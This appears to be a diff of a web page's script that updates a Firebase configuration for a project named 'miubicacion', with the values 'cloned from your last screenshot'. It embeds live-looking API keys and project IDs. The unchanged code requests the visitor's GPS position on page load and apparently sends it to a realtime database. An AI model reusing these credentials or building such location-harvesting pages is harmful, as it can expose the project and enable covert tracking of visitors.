@@ -68,22 +68,23 @@
     </footer>
 
     <script>
-        // CONFIGURACION REAL SIN TRADUCIR
+        // Clonado exactamente de tu ultima captura de pantalla
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
-            authDomain: "miubicacion-22e7f.firebaseapp.com",
-            databaseURL: "https://miubicacion-22e7f-default-rtdb.firebaseio.com",
-            projectId: "miubicacion-22e7f",
-            storageBucket: "miubicacion-22e7f.firebasestorage.app",
+            authDomain: "miubicacion-52e7f.firebaseapp.com",
+            databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
+            projectId: "miubicacion-52e7f",
+            storageBucket: "miubicacion-52e7f.firebasestorage.app",
             messagingSenderId: "847245935895",
-            appId: "1:847245935895:web:e9576ba5280ac05b22e352"
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
+            measurementId: "G-GE5FVZMQXP"
         };
 
         // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Escuchador de carga de ventana
+        // Disparador del GPS al cargar la pagina
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(siPermitio, noPermitio, {
